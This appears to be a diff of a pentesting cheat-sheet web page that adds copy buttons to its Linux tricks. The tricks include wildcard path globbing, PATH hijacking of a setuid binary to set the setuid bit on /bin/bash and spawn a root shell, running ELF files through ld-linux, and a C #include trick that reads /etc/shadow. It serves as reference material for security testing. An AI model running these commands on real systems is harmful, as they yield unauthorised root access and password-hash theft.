@@ -376,34 +376,47 @@
             
               <h1>Linux</h1>
               <h3 id="wildcard">Wildcard</h3>
-<pre><code class="language-bash">$ ls -al /*a*/www/*l/*la*/*la*.*
+<div class="clipboard-content">  <pre><code class="language-bash">$ ls -al /*a*/www/*l/*la*/*la*.*
 #        /var/www/html/flag/flag.php
-</code></pre>
-<pre><code class="language-bash">$ ls
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ ls -al /*a*/www/*l/*la*/*la*.*
+#        /var/www/html/flag/flag.php
+">    Copy  </button></div></div>
+<div class="clipboard-content">  <pre><code class="language-bash">$ ls
 -al
 $ ls *
 -rw-rw-r-- 1 root root 0 jun 28 21:38 -al
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ ls
+-al
+$ ls *
+-rw-rw-r-- 1 root root 0 jun 28 21:38 -al
+">    Copy  </button></div></div>
 <h3 id="privilege-escalation-using-path-variables">Privilege Escalation using PATH variables</h3>
 <p>Here is a simple script to exploit privesc on a binary/script with setuid.</p>
 <p>First you search for vulnerable files:</p>
-<pre><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="find / -perm -u=s -type f 2&gt;/dev/null
+">    Copy  </button></div></div>
 <p>If the script use commands with a relative path then. With <code>echo</code> for instance:</p>
-<pre><code class="language-bash">echo &quot;#!/bin/bash\nchmod u+s /bin/bash&quot; &gt; echo
+<div class="clipboard-content">  <pre><code class="language-bash">echo &quot;#!/bin/bash\nchmod u+s /bin/bash&quot; &gt; echo
 chmod u+x echo
 PATH `pwd`:$PATH ./vuln_binary
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="echo &quot;#!/bin/bash\nchmod u+s /bin/bash&quot; &gt; echo
+chmod u+x echo
+PATH `pwd`:$PATH ./vuln_binary
+">    Copy  </button></div></div>
 <p>This script add the setuid bit to <code>/bin/bash</code>:</p>
-<pre><code class="language-bash">#!/bin/bash
+<div class="clipboard-content">  <pre><code class="language-bash">#!/bin/bash
 chmod u+s /bin/bash
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="#!/bin/bash
+chmod u+s /bin/bash
+">    Copy  </button></div></div>
 <p>Then you run it with the following command:</p>
-<pre><code class="language-bash">/bin/bash -p
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">/bin/bash -p
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="/bin/bash -p
+">    Copy  </button></div></div>
 <h3 id="run-elf-using-ld-linux">Run ELF using ld-linux</h3>
 <p>You can run an ELF binary without the <code>x</code> flag using <code>ld-linux</code>:</p>
-<pre><code class="language-bash"># From: https://twitter.com/leonjza/status/1201946856005259264
+<div class="clipboard-content">  <pre><code class="language-bash"># From: https://twitter.com/leonjza/status/1201946856005259264
 $ cp /bin/ls .
 $ ls
 ls
@@ -414,23 +427,42 @@ $ ./ls
 -bash: ./ls: Permission denied
 $ /lib64/ld-linux-x86-64.so.2 ./ls
 ls
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="# From: https://twitter.com/leonjza/status/1201946856005259264
+$ cp /bin/ls .
+$ ls
+ls
+$ chmod -x ls
+$ ls -l ls
+-rw-r--r-- 1 root root 126584 Dec  4 08:32 ls
+$ ./ls
+-bash: ./ls: Permission denied
+$ /lib64/ld-linux-x86-64.so.2 ./ls
+ls
+">    Copy  </button></div></div>
 <p>It can be useful when you can't set the bit or you have a capability on <code>ld-linux</code> set.</p>
 <h3 id="compile-cc-including-a-file">Compile C/C++ including a file</h3>
 <p>From <a href="https://twitter.com/Poita_/status/1198413809670598662" target="_blank">@Poita_</a> and <a href="https://blog.hboeck.de/archives/898-include-etcshadow.html" target="_blank">hboeck</a>. You can include a file or even <code>/dev/stdin</code>
 when you compile a file. So, it's possible to include <code>/etc/shadow</code> if you have
 the correct permissions on the server. Hboeck explains that it's possible to get
 the file from online compiler (<a href="http://cpp.sh/" target="_blank">cpp.sh</a> may work).</p>
-<pre><code class="language-c">#include &lt;stdio.h&gt;
+<div class="clipboard-content">  <pre><code class="language-c">#include &lt;stdio.h&gt;
 int main() {
   printf(&quot;%s\n&quot;,
     #include &lt;/etc/shadow&gt;
   )
   return 0;
 }
-</code></pre>
-<pre><code class="language-bash">$ g++ a.cpp &amp;&amp; ./a.out
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="#include &lt;stdio.h&gt;
+int main() {
+  printf(&quot;%s\n&quot;,
+    #include &lt;/etc/shadow&gt;
+  )
+  return 0;
+}
+">    Copy  </button></div></div>
+<div class="clipboard-content">  <pre><code class="language-bash">$ g++ a.cpp &amp;&amp; ./a.out
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ g++ a.cpp &amp;&amp; ./a.out
+">    Copy  </button></div></div>
             
           </div>
           <footer>
